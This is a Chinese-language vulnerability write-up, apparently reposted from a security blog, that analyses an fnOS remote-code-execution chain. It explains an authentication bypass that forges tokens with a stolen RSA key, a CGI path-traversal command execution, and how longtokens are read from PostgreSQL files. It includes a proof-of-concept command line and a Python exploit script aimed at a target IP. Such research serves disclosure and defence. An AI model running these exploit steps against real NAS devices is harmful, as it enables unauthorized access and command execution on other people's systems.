#  飞牛系统（fnOS）远程代码执行链：认证绕过  
助力行业的
                    助力行业的  李白你好   2026-02-03 00:01  
  
## 前言  
  
在最近针对飞牛OS的0day攻击中，攻击者可能利用了三个漏洞来实现完整攻击链。作者：bron1e，https://github.com/bron1e/fnos-rce-chain  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/XoIcX2HtlUAiblUh4R9qPraTgZvNXbO8ooGPeWhHVuIORfbAjpaDtuyp9VGQFAGAhe74uMps9OWb2qhjTxTOohA/640?wx_fmt=jpeg&from=appmsg "")  
1. **任意文件读取**  
  
1. **认证绕过**  
  
1. **授权命令执行**  
  
其中任意文件读取和授权命令执行已被披露。本文主要对飞牛OS的认证绕过进行分析，并提出另一潜在命令执行路径。  
## 认证绕过  
### 1. 原理分析  
#### 1.1 登录逻辑  
  
飞牛OS的登录逻辑如下：  
```
用户请求 (Login/ChangePassword)       |       v[ 应用程序 ]       |       +---> 1. 验证/修改密码       |        |       |        +---> [ 内存缓存 passwd ]       |        |       |        +---> [ Linux 系统调用 (crypt/PAM/chpasswd) ] ---> [ /etc/shadow ]       |        |       |        +---> [ smbpasswd 命令 ] ------------------------> [ Samba 密码库 ]       |       +---> 2. 登录成功后生成                +---> [ 内存缓存 secret, token ]                |                +---> [ PostgreSQL 数据库 ] ---> 表: longtoken
```  
  
授权命令执行需要拿到 secret 或者 token。但读取堆内存略微困难，因此要么读取到 longtoken 转化为 token，要么想办法利用业务漏洞。  
#### 1.2 交互逻辑  
  
前端使用 Websocket 协议交互，登录流程如下：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUAiblUh4R9qPraTgZvNXbO8oaqUFXlED8yA9csp74h2f0KeibYaocW3FwZZs4FnBXlFlLRL6QLuhRow/640?wx_fmt=png&from=appmsg "")  
#### 1.3 Token生成逻辑  
  
在 /usr/trim/bin/handlers/users.hdl 中的 do_login 函数中包含了 secret, token, longtoken的生成逻辑：  
- **Secret**  
 (16字节)：随机生成的 16 字节数据，强制将第 16 字节设置为 o  
。  
  
- **Token**  
 (32字节)：  
  
- **前 16 字节**  
 (IV)：由时间戳、计时器和随机数拼接而成。  
  
- **后 16 字节**  
 (Cipher)：使用 RSA 密钥对 Secret 进行 AES 加密后的数据。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUAiblUh4R9qPraTgZvNXbO8oaH0FoNbRnwWS5YmvX4FP1DNT8PCWDbmVo2fYT9WlvdkAf2x28QnOicQ/640?wx_fmt=png&from=appmsg "")  
  
**因此 secret 和 token 可以相互转化**  
，这点很重要。  
  
在 /usr/trim/bin/trim 中的 handle_websocket_packet 函数中包含了鉴权逻辑。  
  
后端能够解析两种类型的包：  
- 加密包：不需要 secret 签名  
  
- 明文包：除非req白名单或者设置了no_sign，否则需要secret对请求体签名  
  
看上去可以构造一个加密包，然后使用 longtoken 进行登录，从而绕过签名：  
```
{    "req": "user.tokenLogin",    "reqid": xxx,    "token": long_token,     "deviceType": xxx,    "deviceName": xxx,    "did": xxx,    "si": xxx,}
```  
  
遗憾的是，加密包会触发token长度的判断。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUAiblUh4R9qPraTgZvNXbO8oicgWaEk8v12VibLKvIacULZIhvzjszUDCBUGBOP4EicMJnKOictIOkZZ3g/640?wx_fmt=png&from=appmsg "")  
  
不过这里存在另一个漏洞：  
  
**验签时如果存在 token 字段，则直接对 token 解密得到 secret，然后对请求体计算签名。**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUAiblUh4R9qPraTgZvNXbO8oXrOMr7h1qDBLnxxEL5UToCxJtDnkgPANxqfCmbW0CcIn0e1V9eACzQ/640?wx_fmt=png&from=appmsg "")  
  
因此，可以自己生成 secret 和 token 绕过认证。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUAiblUh4R9qPraTgZvNXbO8oiapvYBDqKCvNTG7PORTDrk2g6DUVwibSZqVfWQdMian3sCJNIKbRIzIRA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUAiblUh4R9qPraTgZvNXbO8o2zZzD5BK6mDhliaIxYZZuvQ3Xibdy5CpdXZeia11cYLThTpNc0gSdQExw/640?wx_fmt=png&from=appmsg "")  
### 2. PoC  
  
需获取系统中的 rsa_private_key.pem  
（通过任意文件读取漏洞获取）。  
```
# 1. 命令执行python poc.py -k ./rsa_private_key.pem rce# 2. 获取会话tokenpython poc.py -k ./rsa_private_key.pem login -t 9XlXMOgDAABCfaZpAAAAAAluArwO5RZ2JbzjA6m9hmnjp0KtNSz/SA==
```  
## 拓展  
### 1. CGI路径穿越  
  
/usr/trim/bin/trim_http_cgi 存在一个稍弱的路径穿越、命令执行。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUAiblUh4R9qPraTgZvNXbO8oZvxQP7H8BQNKDvm10VzzX97XdNbyg26avVPJMNVXqNZasAvtLw4ricA/640?wx_fmt=png&from=appmsg "")  
  
filepath.Join并不防御路径穿越，因此能从 /var/apps_ui 穿越到 /var，并执行任意文件。但存在有一些限制：  
1. 需要合法token  
  
1. 由于nginx的解析问题，只能穿越一层到 /var  
  
利用思路：需要结合认证绕过和后文提到的postgresql数据库中的longtoken，生成一个合法token，调用文件上传的API，上传一个bash到/var目录。  
```
import requestsimport sysTARGET_IP = "192.168.108.168"TARGET_PORT = 5666TOKEN = "g9auUGNTfmkV7fEAVF6qTdH2kQ9CgBkEHmkUBsNvU/8="url = f"http://{TARGET_IP}:{TARGET_PORT}/cgi/third-party/%2e./bash"headers = {    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",    "Authorization": f"token {TOKEN}",    "Content-Type": "application/x-www-form-urlencoded"}commands = "echo 1> /tmp/test.txt"print(f"[*] Attacking: {url}")print(f"[*] Using Token: {TOKEN[:10]}...")print(f"[*] Command: {commands}")try:    # 发送 POST 请求    response = requests.request("POST", url, headers=headers, data=commands, timeout=10)        print("\n[+] Status Code:", response.status_code)    print("[+] Response Body (Command Output):\n")    print("-" * 40)    print(response.text)    print("-" * 40)except Exception as e:    print(f"[-] Error: {e}")
```  
### 2. 读取postgresql数据库  
  
PostgreSQL数据库位于 /var/lib/postgresql/*/main/base  
  
该目录下有若干个数据库目录，通常为40000+，需要读取每个数据库下的pg_class表（固定OID为1259），然后从中获取 longtoken 表的 OID。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUAiblUh4R9qPraTgZvNXbO8o4vanctoHzPB0HI2sgQYibcIrfmjHJtmdCApicaNvHqMicIbtibicluHOd9g/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUAiblUh4R9qPraTgZvNXbO8oBk1BtRXPHjCefrZ7au2cUupQmFAibt2JnO2SvEJdXZL1dc0ueLTlDmQ/640?wx_fmt=png&from=appmsg "")  
## 参考  
```
https://club.fnnas.com/forum.php?mod=viewthread&tid=53230https://v2ex.com/t/1189392
```  
## 网络安全情报攻防站  
  
**www.libaisec.com**  
  
综合性的技术交流与资源共享社区  
  
专注于红蓝对抗、攻防渗透、威胁情报、数据泄露  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/XoIcX2HtlUAiblUh4R9qPraTgZvNXbO8oRMiaBEP5kWyvcwmKhJG6tkdeQ8LN8Zfe5IyxVrSn3ibetIyQuQF04SRQ/640?wx_fmt=jpeg&from=appmsg "")  
  
  
  
